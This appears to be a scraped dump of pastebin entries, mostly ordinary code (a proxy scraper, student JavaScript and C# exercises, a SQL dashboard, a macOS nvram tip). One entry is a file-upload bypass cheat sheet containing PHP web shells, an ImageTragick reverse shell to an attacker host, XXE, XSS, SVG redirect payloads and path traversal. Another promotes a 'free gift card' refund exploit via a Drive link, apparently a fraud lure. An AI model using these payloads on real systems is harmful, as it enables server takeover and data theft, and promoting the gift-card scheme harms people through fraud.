id,title,username,language,date,content
SgA94dDR,G2A.com Free Gift Card Guide Mar 2024,ounnuo,GetText,Tuesday 5th of March 2024 06:03:26 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_822341.pdf

Working as of:
05 March 2024"
SxUfyXq1,data860,TestGuy1,JSON,Tuesday 5th of March 2024 06:00:10 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'c699d4946a3808fcebd2cf68a97cf366b93f008270d1281bfbae22e48cbf55e3d0f68925e49a57c85e47228074ebcb59680a5ce91cd3e7a5ea886ef72e5441fb50b4fcad59e33c1a07e206d06eafd619ea6a5b7f9fdebf35f6e53c28001192b13dd6816876db4bd27f7d8ce34b668bd9be9bbf39a501f5be5096d7e891918370',
  otherdata: [
    '90d5d5b63c944128b0e10bf07d8165bc',
    'c4a47f7c5a987a8ba59d56d5e718b165',
    '7a86a50e2d3b3bfbc05f2bf342b5c4fe',
    '98b0ac92fae404e94f57f4d81d69eb4c',
    'f576fbdb60be8aef178d170998dc8b96',
    '96fef9d165b16b000d2c5fa888973e80',
    'b89f5c1d764b2b7f63961004b28322c1',
    '1db8c43855daf465b81450e2e06f9f8f'
  ]
}"
JdAmXZEN,Untitled,MikiSoft,JavaScript,Tuesday 5th of March 2024 05:59:59 AM CDT,"// https://spys.one/en/socks-proxy-list/

let rows = document.querySelectorAll('tr.spy1xx, tr.spy1x');
let results = [];

// Convert NodeList to Array and skip the first row
rows = Array.from(rows).slice(1);

rows.forEach(row => {
  let tdElement = row.querySelector('td');
  
  // Clone the td element and remove all script tags from the clone
  let clone = tdElement.cloneNode(true);
  let scripts = clone.querySelectorAll('script');
  scripts.forEach(script => script.remove());
  
  // Get the text content from the clone
  let textContent = clone.textContent.trim();
  
  results.push(textContent);
});
console.log(results.join('\n'))


// https://hidemy.io/en/proxy-list/

// Find the table
let table = document.querySelector('table');
results = [];

// Extract IP:Port from the first two columns of each row
let ipPorts = Array.from(table.querySelectorAll('tr')).slice(1).map(row => {
    let columns = Array.from(row.querySelectorAll('td'));
    if (columns.length >= 2) {
        let ip = columns[0].textContent;
        let port = columns[1].textContent;
        return `${ip}:${port}`;
    }
});

// Print the results
ipPorts.forEach(ipPort => {
    if (ipPort) results.push(ipPort);
});
console.log(results.join('\n'))"
bezVwLwa,Untitled,b3gund4L,JSON,Tuesday 5th of March 2024 05:55:44 AM CDT,"1. Change the `Content-Type` value
```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name=""uploaded""; filename=""dapos.php""
Content-Type: application/x-php
```
Change the Content-Type
```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name=""uploaded""; filename=""dapos.php""
Content-Type: image/jpeg
```

2. Try to change the extension when send the request, for example in here you cant upload file with ext php but you can upload jpg file
```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name=""uploaded""; filename=""dapos.php.jpg""
Content-Type: application/x-php
```
Change the request to this
```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name=""uploaded""; filename=""dapos.php""
Content-Type: application/x-php
```

3. Upload the payload, but start with GIF89a; and
```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name=""uploaded""; filename=""dapos.php""
Content-Type: image/gif

GIF89a; <?php system(""id"") ?>
```
And dont forget to change the content-type to image/gif

4. Bypass content length validation, it can be bypassed using small payload
```
(<?=`$_GET[x]`?>)
```

5. Using null byte in filename
```
file.php%00.gif
```

6. Using double extensions for the uploaded file
```
file.jpg.php
```

7.  Uploading an unpopular php extensions (php4,php5,php6,phtml)
```
file.php5
```

8. Try to randomly capitalizes the file extension
```
file.pHP5
```

9. Mix the tips!


- Upload Function
    - Extensions Impact
        - `ASP`, `ASPX`, `PHP5`, `PHP`, `PHP3`: Webshell, RCE
        - `SVG`: Stored XSS, SSRF, XXE
        - `GIF`: Stored XSS, SSRF
        - `CSV`: CSV injection
        - `XML`: XXE
        - `AVI`: LFI, SSRF
        - `HTML`, `JS` : HTML injection, XSS, Open redirect
        - `PNG`, `JPEG`: Pixel flood attack (DoS)
        - `ZIP`: RCE via LFI, DoS
        - `PDF`, `PPTX`: SSRF, BLIND XXE
    - Blacklisting Bypass
        - PHP → `.phtm`, `phtml`, `.phps`, `.pht`, `.php2`, `.php3`, `.php4`, `.php5`, `.shtml`, `.phar`, `.pgif`, `.inc`
        - ASP → `asp`, `.aspx`, `.cer`, `.asa`
        - Jsp → `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`
        - Coldfusion → `.cfm`, `.cfml`, `.cfc`, `.dbm`
        - Using random capitalization → `.pHp`, `.pHP5`, `.PhAr`
    - Whitelisting Bypass
        - `file.jpg.php`
        - `file.php.jpg`
        - `file.php.blah123jpg`
        - `file.php%00.jpg`
        - `file.php\x00.jpg` this can be done while uploading the file too, name it `file.phpD.jpg` and change the D (44) in hex to 00.
        - `file.php%00`
        - `file.php%20`
        - `file.php%0d%0a.jpg`
        - `file.php.....`
        - `file.php/`
        - `file.php.\`
        - `file.php#.png`
        - `file.`
        - `.html`
    - Vulnerabilities
        - [ ]  Directory Traversal
            - Set filename `../../etc/passwd/logo.png`
            - Set filename `../../../logo.png` as it might changed the website logo.
        - [ ]  SQL Injection
            - Set filename `'sleep(10).jpg`.
            - Set filename `sleep(10)-- -.jpg`.
        - [ ]  Command Injection
            - Set filename `; sleep 10;`
        - [ ]  SSRF
            - Abusing the ""Upload from URL"", if this image is going to be saved in some public site, you could also indicate a URL from [IPlogger](https://iplogger.org/invisible/) and steal information of every visitor.
            - SSRF Through `.svg` file.

            ```php
            <?xml version=""1.0"" encoding=""UTF-8"" standalone=""no""?><svg xmlns:svg=""http://www.w3.org/2000/svg"" xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" width=""200"" height=""200""><image height=""200"" width=""200"" xlink:href=""https://attacker.com/picture.jpg"" /></svg>
            ```

        - [ ]  ImageTragic

            ```
            push graphic-context
            viewbox 0 0 640 480
            fill 'url(https://127.0.0.1/test.jpg""|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch ""hello)'
            pop graphic-context
            ```

        - [ ]  XXE
            - Upload using `.svg` file

            ```xml
            <?xml version=""1.0"" standalone=""yes""?>
            <!DOCTYPE test [ <!ENTITY xxe SYSTEM ""file:///etc/hostname"" > ]>
            <svg width=""500px"" height=""500px"" xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" version=""1.1"">
               <text font-size=""40"" x=""0"" y=""16"">&xxe;</text>
            </svg>
            ```

            ```xml
            <svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" width=""300"" version=""1.1"" height=""200"">
                <image xlink:href=""expect://ls""></image>
            </svg>
            ```

            - Using excel file
        - [ ]  XSS
            - Set file name `filename=""svg onload=alert(document.domain)>""` , `filename=""58832_300x300.jpg<svg onload=confirm()>""`
            - Upload using `.gif` file

            ```
            GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
            ```

            - Upload using `.svg` file

            ```xml
            <svg xmlns=""http://www.w3.org/2000/svg"" onload=""alert(1)""/>
            ```

            ```xml
            <?xml version=""1.0"" standalone=""no""?>
            <!DOCTYPE svg PUBLIC ""-//W3C//DTD SVG 1.1//EN"" ""http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"">

            <svg version=""1.1"" baseProfile=""full"" xmlns=""http://www.w3.org/2000/svg"">
               <rect width=""300"" height=""100"" style=""fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)"" />
               <script type=""text/javascript"">
                  alert(""HolyBugx XSS"");
               </script>
            </svg>
            ```

        - [ ]  Open Redirect
            1. Upload using `.svg` file

            ```xml
            <code>
            <?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>
            <svg
            onload=""window.location='https://attacker.com'""
            xmlns=""http://www.w3.org/2000/svg"">
            <rect width=""300"" height=""100"" style=""fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)"" />
            </svg>
            </code>
            ```

    - Content-ish Bypass
        - [ ]  Content-type validation
            - Upload `file.php` and change the `Content-type: application/x-php` or `Content-Type : application/octet-stream` 
            to `Content-type: image/png` or `Content-type: image/gif` or `Content-type: image/jpg`.
        - [ ]  Content-Length validation
            - Small PHP Shell

            ```php
            (<?=`$_GET[x]`?>)
            ```

        - [ ]  Content Bypass Shell
            - If they check the Content. Add the text ""GIF89a;"" before you shell-code. ( `Content-type: image/gif` )

            ```php
            GIF89a; <?php system($_GET['cmd']); ?>
            ```

    - Misc
        - [ ]  Uploading `file.js` & `file.config` (web.config)
        - [ ]  Pixel flood attack using image
        - [ ]  DoS with a large values name: `1234...99.png`
        - [ ]  Zip Slip
            - If a site accepts `.zip` file, upload `.php` and compress it into `.zip` and upload it. Now visit, `site.com/path?page=zip://path/file.zip%23rce.php`
        - [ ]  Image Shell
            - Exiftool is a great tool to view and manipulate exif-data. Then I will to rename the file `mv pic.jpg pic.php.jpg`

            ```php
            exiftool -Comment='<?php echo ""<pre>""; system($_GET['cmd']); ?>' pic.jpg
            ```"
ADubf8Pg,Untitled,zarkoto223,JavaScript,Tuesday 5th of March 2024 05:43:05 AM CDT,"function asd(input) {
    let index = 0
    let movieName = input[index]

    let standart = 0
    let students = 0
    let kid = 0
    let percentUsedSpace = 0
    let totalTickets = 0
    let totalPStandart = 0
    let totalPStudents = 0
    let totalPKid = 0
    let flag = true

    while (flag) {
        movieName = input[index]
        index++ //
        let freeSpaces = Number(input[index])
        index++
        let typeTicket = input[index]
        while (typeTicket !== 'End') {
            index++
            if (typeTicket === 'standard') {
                standart += 1
                totalTickets += 1
            } else if (typeTicket === 'kid') {
                kid += 1
                totalTickets += 1
            } else if (typeTicket === 'student') {
                students += 1
                totalTickets += 1
            }
            if (typeTicket === 'End') {
                index++
                movieName = input[index]
                break
            }
            typeTicket = input[index]
            if (typeTicket === 'Finish') {
                flag = false
            }
        }
        
        index++


    }

    console.log(totalTickets)






}
asd([""The Matrix"",
    ""20"",
    ""student"",
    ""standard"",
    ""kid"",
    ""kid"",
    ""student"",
    ""student"",
    ""standard"",
    ""student"",
    ""End"",
    ""The Green Mile"",
    ""17"",
    ""student"",
    ""standard"",
    ""standard"",
    ""student"",
    ""standard"",
    ""student"",
    ""End"",
    ""Amadeus"",
    ""3"",
    ""standard"",
    ""standard"",
    ""standard"",
    ""Finish""])
"
6Ccz6xpT,KlasaProgram_doKlasyPies,cuniszkiewicz,C#,Tuesday 5th of March 2024 05:28:46 AM CDT,"using OOP_1S122L_Pitwww;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace OOP_1S122L_Pitwwwm                                                
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Pies pies = new Pies();
            Pies pies2 = new Pies();


            pies2.Imie = ""Teodor"";
            pies.Imie = ""Pimpek"";
            /*
            pies.rasa = ""Shih-tzu"";
            pies.ulubionaZabawka = ""piłeczka"";
            pies.kolor = ""rudy"";
            pies.waga = 9;
            //pies.wiek = 16;

            //pies.UstawWiekPsa(60);
            pies.Wiek = 40;
            Console.WriteLine($""Nasz piesek ma {pies.Wiek} lat"");
            pies.TemperaturaC = 40;
            Console.WriteLine($""pies ma {pies.TemperaturaC} stopni C"");
            Console.WriteLine($""pies ma {pies.TemperaturaK} stopni K"");
            pies.TemperaturaK = 313;
            Console.WriteLine($""pies ma {pies.TemperaturaC} stopni C"");
            Console.WriteLine($""pies ma {pies.TemperaturaK} stopni K"");

            pies.PrzedstawPieska();
            pies.Poglaszcz();
            pies.Pochwal();
            pies.Nakarm();
            pies.PobawSie(""cokolwiek"");
            */
            pies.ulubionaZabawka = ""piłka"";
            pies2.ulubionaZabawka = ""szarpak"";
            
            pies.PrzedstawPieska();
            pies2.PrzedstawPieska();

            Console.ReadKey();
        }
    }
}
"
FRqSsQpi,KlasaPies,cuniszkiewicz,C#,Tuesday 5th of March 2024 05:27:57 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace OOP_1S122L_Pitwww
{
    internal class Pies
    {
        private string imie;
        public string rasa;
        public string ulubionaZabawka;
        public string kolor;
        public double waga;
        private int wiek;
        private double temperatura;

        public double TemperaturaC
        {
            get { return temperatura; }
            set {
                if (value < 35 || value > 45)
                    temperatura = 39;
                else
                    temperatura = value;
            }
        }
        public double TemperaturaK
        {
            get { return temperatura + 273; }
            set
            {
                if (value < 308 || value > 318)
                    temperatura = 39;
                else
                    temperatura = value - 273;
            }
        }



        public string Imie
        {
            get { return imie; }
            set { imie = value; }
        }

        public int Wiek
        {
            get
            {
                return wiek;
            }
            set
            {
                if (value > 0 && value < 25)
                {
                    wiek = value;
                }
                else
                {
                    Console.WriteLine(""Podano wiek spoza przewidywanego zakresu 0-25 lat i ustawiono wiek na 5 lat."");
                    Console.ReadKey();
                    wiek = 5;
                }
            }
        
        }





        public void UstawWiekPsa(int w)
        {
            if (w > 0 && w < 25)
            {
                wiek = w;
            }
            else
            {
                Console.WriteLine(""Podano wiek spoza przewidywanego zakresu 0-25 lat i ustawiono wiek na 5 lat."");
                Console.ReadKey();
                wiek = 5;
            }
        }
        public int PobierzWiekPsa()
        {
            return wiek;
        }
        public void Poglaszcz()
        {
            Console.WriteLine(""Piesek kładzie się na plecach i mruczy"");
        }
        public void Nakarm()
        {
            Console.WriteLine(""Piesek je karmę. Mniam Mniam."");
        }
        public void PrzedstawPieska()
        {
            Console.WriteLine($""Cześć jestem {imie} i jestem rasy: {rasa}. "" +
                $""Moja ulubiona zabawka to: {ulubionaZabawka}."");
        }
        public void Pochwal()
        {
            Console.WriteLine(""Pochwaliłeś pieska i teraz macha ogonkiem."");
        }

        public void PobawSie(string zabawka = """")
        {
            if (zabawka == """")
            {
                Console.WriteLine(""Wybierz zabawkę:"");
                Console.WriteLine(""* piłeczka"");
                Console.WriteLine(""* szarpak"");
                Console.WriteLine(""* kurczak"");
                Console.Write(""Twój wybór: "");
                zabawka = Console.ReadLine();
            }
            switch (zabawka)
            {
                case ""piłeczka"":
                    Console.WriteLine(""Piesek bawi się piłeczką"");
                    break;
                case ""szarpak"":
                    Console.WriteLine(""Piesek szarpie szarpak"");
                    break;
                case ""kurczak"":
                    Console.WriteLine(""Piesek piszczy gumowym kurczakiem"");
                    break;
                default:
                    Console.WriteLine(""Piesek się bawi."");
                    break;
            }
        }
    }
}
"
3pq1rw8L,Evitar que el mac se inicie al levantar la tapa,Templario_7777,Bash,Tuesday 5th of March 2024 05:27:31 AM CDT,"
Evitar que el mac se inicie al levantar la tapa
sudo nvram autoboot=%00

Restaurar la configuracion:
sudo nvram autoboot=%03"
WnTBYyMt,Review TrioMarkets,fxvnpro,PHP,Tuesday 5th of March 2024 05:22:33 AM CDT,https://www.fxvnpro.com/review-triomarkets/
if3jShnN,Untitled,YuvalGai,SQL,Tuesday 5th of March 2024 05:21:51 AM CDT,"t_revenue_dashboard = {
    'create or replace' :'''
        CREATE OR REPLACE TABLE CANDIVORE.SEMANTIC_LAYER.T_REVENUE_DASHBOARD AS 
SELECT
DATE(A.derived_tstamp) AS interval_date
,B.league
,B.trophy_group
, B.LTV_group
, B.payers_segment
, date_trunc('MONTH',DATE(A.first_install_dt)) AS monthly_cohort
, B.country
, B.platform
, A.purchase_type
, A.purchase_subtype
, A.price_point
, A.template_id
, A.package
, A.special_offer_id
, A.sub_offer_id
, CASE WHEN A.lt_purchases_amt = 1 THEN 1 ELSE 0 END ftds
, CASE WHEN A.lt_purchases_amt = 2 THEN 1 ELSE 0 END stds
, CASE WHEN A.lt_purchases_amt = 3 THEN 1 ELSE 0 END ttds
, COUNT(A.iap_price) AS Purchases
, SUM(A.iap_price) AS Revenue
, COUNT(DISTINCT A.user_id) AS Active_Users
FROM 
((SELECT *, DATE(derived_tstamp) interval_Date FROM CANDIVORE.PROD.F_IN_APP_PURCHASE WHERE DATE(derived_tstamp) >= '2022-10-01') A 
 
LEFT JOIN 
 
(SELECT
user_id
, interval_date
, country
, LANGUAGE
, platform
, app_version
, app_minor_version
, ltv_group
, DATE(first_install_dt) AS install_date
, payers_segment
, CASE 
WHEN trophies_cnt < 1500 THEN '0-1500' 
    WHEN trophies_cnt < 3800 THEN '1500-3800' 
    WHEN trophies_cnt < 8000 THEN '3800-8000' 
    WHEN trophies_cnt < 17000 THEN '8000-17000'
    WHEN trophies_cnt < 30000 THEN '17000-30000'
    ELSE '30000+'
END AS trophy_group
,CASE
    WHEN trophies_cnt < 800 THEN '800'
    WHEN finish_arena<=13 THEN 'Studios'
    WHEN finish_arena<=22 THEN 'Master_League'
    WHEN finish_arena>=23 THEN 'Legends_League'
 END league

FROM candivore.prod.daily_users_from_params WHERE interval_date >= '2022-10-01') B
 
ON A.user_id = B.user_id AND A.interval_date = B.interval_date)        
 
GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
 
    '''
}"
